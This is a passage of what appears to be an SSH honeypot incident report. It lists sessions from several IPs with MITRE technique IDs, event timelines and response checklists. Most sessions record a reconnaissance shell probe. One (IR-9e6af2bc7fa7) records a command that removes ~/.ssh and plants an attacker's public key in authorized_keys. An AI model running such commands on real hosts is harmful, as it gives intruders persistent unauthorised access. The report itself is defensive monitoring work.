- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d1a9261843

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:42 |
| **Last Seen** | 2026-07-24 18:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:42:40` | `cowrie.session.connect` |
| `2026-07-24 18:42:40` | `cowrie.client.version` |
| `2026-07-24 18:42:40` | `cowrie.client.kex` |
| `2026-07-24 18:42:41` | `cowrie.login.success` |
| `2026-07-24 18:42:42` | `cowrie.session.params` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.success` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.command.input` |
| `2026-07-24 18:42:42` | `cowrie.log.closed` |
| `2026-07-24 18:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9316e3d32b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:42 |
| **Last Seen** | 2026-07-24 18:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:42:57` | `cowrie.session.connect` |
| `2026-07-24 18:42:57` | `cowrie.client.version` |
| `2026-07-24 18:42:57` | `cowrie.client.kex` |
| `2026-07-24 18:42:58` | `cowrie.login.success` |
| `2026-07-24 18:42:59` | `cowrie.session.params` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.success` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.command.input` |
| `2026-07-24 18:42:59` | `cowrie.log.closed` |
| `2026-07-24 18:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f262307f19df

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:44 |
| **Last Seen** | 2026-07-24 18:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:44:12` | `cowrie.session.connect` |
| `2026-07-24 18:44:12` | `cowrie.client.version` |
| `2026-07-24 18:44:12` | `cowrie.client.kex` |
| `2026-07-24 18:44:13` | `cowrie.login.success` |
| `2026-07-24 18:44:14` | `cowrie.session.params` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.success` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:14` | `cowrie.command.input` |
| `2026-07-24 18:44:15` | `cowrie.log.closed` |
| `2026-07-24 18:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc8be9dce7c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:44 |
| **Last Seen** | 2026-07-24 18:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:44:23` | `cowrie.session.connect` |
| `2026-07-24 18:44:23` | `cowrie.client.version` |
| `2026-07-24 18:44:23` | `cowrie.client.kex` |
| `2026-07-24 18:44:24` | `cowrie.login.success` |
| `2026-07-24 18:44:25` | `cowrie.session.params` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.success` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.command.input` |
| `2026-07-24 18:44:25` | `cowrie.log.closed` |
| `2026-07-24 18:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c70cb91831e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:45 |
| **Last Seen** | 2026-07-24 18:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:45:29` | `cowrie.session.connect` |
| `2026-07-24 18:45:29` | `cowrie.client.version` |
| `2026-07-24 18:45:29` | `cowrie.client.kex` |
| `2026-07-24 18:45:30` | `cowrie.login.success` |
| `2026-07-24 18:45:31` | `cowrie.session.params` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.success` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.command.input` |
| `2026-07-24 18:45:31` | `cowrie.log.closed` |
| `2026-07-24 18:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-486632399ceb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:46 |
| **Last Seen** | 2026-07-24 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:46:19` | `cowrie.session.connect` |
| `2026-07-24 18:46:19` | `cowrie.client.version` |
| `2026-07-24 18:46:20` | `cowrie.client.kex` |
| `2026-07-24 18:46:21` | `cowrie.login.success` |
| `2026-07-24 18:46:22` | `cowrie.session.params` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.success` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.command.input` |
| `2026-07-24 18:46:22` | `cowrie.log.closed` |
| `2026-07-24 18:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ed3dc30484

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:46 |
| **Last Seen** | 2026-07-24 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:46:49` | `cowrie.session.connect` |
| `2026-07-24 18:46:49` | `cowrie.client.version` |
| `2026-07-24 18:46:49` | `cowrie.client.kex` |
| `2026-07-24 18:46:50` | `cowrie.login.success` |
| `2026-07-24 18:46:51` | `cowrie.session.params` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.success` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:51` | `cowrie.command.input` |
| `2026-07-24 18:46:52` | `cowrie.log.closed` |
| `2026-07-24 18:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6af2bc7fa7

| Field | Detail |
|---|---|
| **Source IP** | `207.56.225[.]202` |
| **First Seen** | 2026-07-24 18:47 |
| **Last Seen** | 2026-07-24 18:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:47:55` | `cowrie.session.connect` |
| `2026-07-24 18:47:55` | `cowrie.client.version` |
| `2026-07-24 18:47:55` | `cowrie.client.kex` |
| `2026-07-24 18:47:56` | `cowrie.login.success` |
| `2026-07-24 18:47:56` | `cowrie.session.params` |
| `2026-07-24 18:47:56` | `cowrie.command.input` |
| `2026-07-24 18:47:56` | `cowrie.command.failed` |
| `2026-07-24 18:47:57` | `cowrie.log.closed` |
| `2026-07-24 18:47:58` | `cowrie.session.params` |
| `2026-07-24 18:47:58` | `cowrie.command.input` |
| `2026-07-24 18:47:58` | `cowrie.session.file_download` |
| `2026-07-24 18:47:58` | `cowrie.log.closed` |
| `2026-07-24 18:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.56.225[.]202` to AbuseIPDB if not already reported
- [ ] Block `207.56.225[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe49ae9f0f0

| Field | Detail |
|---|---|
| **Source IP** | `207.56.225[.]202` |
| **First Seen** | 2026-07-24 18:47 |
| **Last Seen** | 2026-07-24 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:47:58` | `cowrie.session.connect` |
| `2026-07-24 18:47:58` | `cowrie.client.version` |
| `2026-07-24 18:47:58` | `cowrie.client.kex` |
| `2026-07-24 18:47:59` | `cowrie.login.success` |
| `2026-07-24 18:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.56.225[.]202` to AbuseIPDB if not already reported
- [ ] Block `207.56.225[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f28a0d95e6e

| Field | Detail |
|---|---|
| **Source IP** | `207.56.225[.]202` |
| **First Seen** | 2026-07-24 18:47 |
| **Last Seen** | 2026-07-24 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:47:59` | `cowrie.session.connect` |
| `2026-07-24 18:47:59` | `cowrie.client.version` |
| `2026-07-24 18:47:59` | `cowrie.client.kex` |
| `2026-07-24 18:48:00` | `cowrie.login.success` |
| `2026-07-24 18:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.56.225[.]202` to AbuseIPDB if not already reported
- [ ] Block `207.56.225[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68eaded3eae2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:48 |
| **Last Seen** | 2026-07-24 18:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:48:10` | `cowrie.session.connect` |
| `2026-07-24 18:48:10` | `cowrie.client.version` |
| `2026-07-24 18:48:10` | `cowrie.client.kex` |
| `2026-07-24 18:48:12` | `cowrie.login.success` |
| `2026-07-24 18:48:13` | `cowrie.session.params` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.success` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.command.input` |
| `2026-07-24 18:48:13` | `cowrie.log.closed` |
| `2026-07-24 18:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e400b17df96e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:48 |
| **Last Seen** | 2026-07-24 18:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:48:12` | `cowrie.session.connect` |
| `2026-07-24 18:48:12` | `cowrie.client.version` |
| `2026-07-24 18:48:12` | `cowrie.client.kex` |
| `2026-07-24 18:48:13` | `cowrie.login.success` |
| `2026-07-24 18:48:15` | `cowrie.session.params` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.success` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.command.input` |
| `2026-07-24 18:48:15` | `cowrie.log.closed` |
| `2026-07-24 18:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01c5f1373f5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:49 |
| **Last Seen** | 2026-07-24 18:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:49:31` | `cowrie.session.connect` |
| `2026-07-24 18:49:31` | `cowrie.client.version` |
| `2026-07-24 18:49:31` | `cowrie.client.kex` |
| `2026-07-24 18:49:33` | `cowrie.login.success` |
| `2026-07-24 18:49:34` | `cowrie.session.params` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.success` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:34` | `cowrie.command.input` |
| `2026-07-24 18:49:36` | `cowrie.log.closed` |
| `2026-07-24 18:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab029a9c83ce

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 18:49 |
| **Last Seen** | 2026-07-24 18:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:49:39` | `cowrie.session.connect` |
| `2026-07-24 18:49:39` | `cowrie.client.version` |
